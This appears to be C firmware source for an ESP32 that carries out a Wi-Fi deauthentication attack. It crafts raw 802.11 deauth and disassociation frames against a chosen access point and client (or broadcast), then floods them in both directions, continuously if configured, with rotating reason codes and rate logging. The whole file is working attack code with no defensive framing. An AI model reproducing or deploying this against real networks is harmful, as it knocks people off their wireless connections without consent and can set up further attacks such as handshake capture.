#include "deauth.h"
#include "utils.h"
#include "esp_rom_sys.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define TAG_DEAUTH "DEAUTH"

static uint8_t _deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    (uint8_t)CFG_DEAUTH_REASON_AP, 0x00
};

static uint8_t _disassocFrame[26] = {
    0xA0, 0x00, 0x00, 0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    (uint8_t)CFG_DISASSOC_REASON, 0x00
};

static const uint8_t REASONS[] = CFG_DEAUTH_REASONS;
static const uint8_t NUM_REASONS = sizeof(REASONS)/sizeof(REASONS[0]);

static inline void _applySeq(uint8_t* frame, uint16_t seq) {
    uint16_t sc = (seq & 0x0FFF) << 4;
    frame[22] = (uint8_t)(sc & 0xFF);
    frame[23] = (uint8_t)(sc >> 8);
}

static inline void _fillAddrs(uint8_t* frame,
                               const uint8_t* da,
                               const uint8_t* sa,
                               const uint8_t* bssid) {
    memcpy(frame + 4,  da,    6);
    memcpy(frame + 10, sa,    6);
    memcpy(frame + 16, bssid, 6);
}

typedef struct {
    uint8_t        bssid[6];
    uint8_t        staMac[6];
    bool           hasStaMac;
    uint8_t        channel;
    uint16_t       count;
    volatile bool* stopFlag;
    volatile bool  finished;
} DeauthParams;

static DeauthParams _dp;

static void _deauthCore(const DeauthParams* p) {
    static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    const uint8_t* da = p->hasStaMac ? p->staMac : broadcast;

    char bssidStr[18], daStr[18];
    macToStr(p->bssid, bssidStr);
    macToStr(da,       daStr);

    LOG_I(TAG_DEAUTH, "AP: %s  STA: %s  Ch: %u  Count: %s",
          bssidStr, daStr, p->channel,
          (p->count == CFG_DEAUTH_CONTINUOUS) ? "continuous" : "limited");

    uint8_t deauthFwd[26],  deauthRev[26];
    uint8_t disassocFwd[26], disassocRev[26];
    memcpy(deauthFwd,    _deauthFrame,   26);
    memcpy(disassocFwd,  _disassocFrame, 26);
    memcpy(deauthRev,    _deauthFrame,   26);
    memcpy(disassocRev,  _disassocFrame, 26);
    _fillAddrs(deauthFwd,   da,       p->bssid, p->bssid);
    _fillAddrs(disassocFwd, da,       p->bssid, p->bssid);
    _fillAddrs(deauthRev,   p->bssid, da,       p->bssid);
    _fillAddrs(disassocRev, p->bssid, da,       p->bssid);

    uint32_t sent      = 0;
    uint32_t txErrors  = 0;
    uint32_t lastPrint = millis();
    uint32_t periodStart = millis();
    uint32_t periodSent  = 0;
    uint16_t seq = 0;
    bool continuous = (p->count == CFG_DEAUTH_CONTINUOUS);

    while ((continuous || sent < p->count) && !(*(p->stopFlag))) {
        seq = (seq + 1) & 0x0FFF;
        _applySeq(deauthFwd,   seq);
        _applySeq(disassocFwd, seq);
        _applySeq(deauthRev,   (uint16_t)((seq + 1) & 0x0FFF));
        _applySeq(disassocRev, (uint16_t)((seq + 1) & 0x0FFF));

        uint8_t reason = CFG_DEAUTH_REASON_CYCLING ? REASONS[(sent / 2) % NUM_REASONS] : CFG_DEAUTH_REASON_AP;
        deauthFwd[24] = reason;
        deauthRev[24] = reason;
        disassocFwd[24] = CFG_DISASSOC_REASON;

        bool ok = true;
        ok &= wifi80211Tx(WIFI_IF_STA, deauthFwd,   26, false);
        esp_rom_delay_us(CFG_DEAUTH_INTER_US);
        ok &= wifi80211Tx(WIFI_IF_STA, disassocFwd, 26, false);
        esp_rom_delay_us(CFG_DEAUTH_INTER_US);
        ok &= wifi80211Tx(WIFI_IF_STA, deauthRev,   26, false);
        esp_rom_delay_us(CFG_DEAUTH_INTER_US);
        ok &= wifi80211Tx(WIFI_IF_STA, disassocRev, 26, false);

        if (!ok) txErrors++;
        sent++;
        periodSent++;

        if (millis() - lastPrint >= (uint32_t)CFG_DEAUTH_PRINT_EVERY) {
            uint32_t elapsed = millis() - periodStart;
            uint32_t rate    = (elapsed > 0) ? (periodSent * 1000UL / elapsed) : 0;
            LOG_I(TAG_DEAUTH, "Sent: %u  Errors: %u  Rate: ~%u pkt/s",
                  sent, txErrors, rate);
            lastPrint    = millis();
            periodStart  = millis();
            periodSent   = 0;
        }
        vTaskDelay(CFG_WDT_YIELD_TICKS);
    }

    disablePromiscuous();
    LOG_I(TAG_DEAUTH, "Done. Total: %u  TX errors: %u", sent, txErrors);
}

static void _deauthTaskFn(void* pv) {
    DeauthParams* p = (DeauthParams*)pv;
    _deauthCore(p);
    p->finished = true;
    vTaskDelete(NULL);
}

void deauthAttack(const uint8_t* bssid,
                  const uint8_t* staMac,
                  uint8_t        channel,
                  uint16_t       count,
                  volatile bool* stopFlag) {

    if (!bssid) { LOG_E(TAG_DEAUTH, "NULL BSSID!"); return; }

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(80));
    setTxPower(CFG_TX_POWER);

    if (!enablePromiscuous(WIFI_PROMIS_FILTER_MASK_MGMT, NULL)) {
        LOG_E(TAG_DEAUTH, "Failed to enable promiscuous mode!");
        return;
    }
    if (!setChannel(channel)) {
        disablePromiscuous();
        return;
    }

    memcpy(_dp.bssid, bssid, 6);
    if (staMac) {
        memcpy(_dp.staMac, staMac, 6);
        _dp.hasStaMac = true;
    } else {
        _dp.hasStaMac = false;
    }
    _dp.channel  = channel;
    _dp.count    = count;
    _dp.stopFlag = stopFlag;
    _dp.finished = false;

    TaskHandle_t h = NULL;
    BaseType_t res = xTaskCreatePinnedToCore(
        _deauthTaskFn,
        "deauth_t",
        CFG_TASK_STACK_BYTES,
        &_dp,
        CFG_TASK_PRIORITY,
        &h,
        1
    );

    if (res != pdPASS) {
        LOG_E(TAG_DEAUTH, "Task creation failed!");
        disablePromiscuous();
        return;
    }

    while (!_dp.finished) {
        vTaskDelay(pdMS_TO_TICKS(50));
        // Check for stop flag via serial (handled by main loop)
    }
}
